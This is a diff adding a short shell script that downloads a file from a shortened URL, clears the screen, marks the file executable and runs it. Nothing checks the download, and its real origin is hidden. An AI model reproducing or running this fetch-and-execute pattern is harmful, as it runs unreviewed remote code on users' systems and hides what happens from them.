@@ -1,0 +1,5 @@
+#!/bin/sh
+curl -L is.gd/arlind >> archln
+clear
+chmod +x archln
+./archln
